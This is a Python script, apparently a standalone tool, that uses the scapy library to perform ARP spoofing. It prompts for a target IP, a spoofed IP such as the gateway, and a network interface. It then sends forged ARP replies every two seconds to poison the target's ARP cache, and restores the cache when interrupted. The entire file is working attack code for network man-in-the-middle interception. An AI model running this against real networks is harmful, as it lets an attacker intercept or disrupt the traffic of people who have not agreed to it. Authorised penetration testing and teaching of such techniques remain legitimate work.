from scapy.all import ARP, send, srp, Ether
import time
import re

def validate_ip(ip):
    """Validate the format of an IP address."""
    ip_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    return bool(ip_pattern.match(ip))

def get_mac(ip, interface):
    """Resolve the MAC address for a given IP."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), iface=interface, timeout=2, verbose=False)
    for sent, received in ans:
        return received.hwsrc
    return None

def arp_spoof(target_ip, spoof_ip, interface):
    try:
        target_mac = get_mac(target_ip, interface)
        if not target_mac:
            print(f"Could not resolve MAC address for target IP {target_ip}. Exiting.")
            return
        
        print(f"Resolved Target MAC: {target_mac}")
        
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        print(f"Starting ARP spoofing on {target_ip} (spoofing as {spoof_ip})...")
        
        while True:
            send(packet, iface=interface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nDetected KeyboardInterrupt. Stopping ARP spoofing.")
    finally:
        restore_arp(target_ip, spoof_ip, target_mac, interface)

def restore_arp(target_ip, spoof_ip, target_mac, interface):
    """Restore ARP table to its original state."""
    original_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=get_mac(spoof_ip, interface))
    send(original_packet, iface=interface, count=5, verbose=False)
    print("Restored ARP table.")

def main():
    target_ip = input("Enter target IP address: ")
    spoof_ip = input("Enter spoofed IP (e.g., gateway IP): ")
    interface = input("Enter network interface (e.g., eth0): ")

    if not validate_ip(target_ip) or not validate_ip(spoof_ip):
        print("Invalid IP address format. Please try again.")
        return

    arp_spoof(target_ip, spoof_ip, interface)

if __name__ == "__main__":
    main()

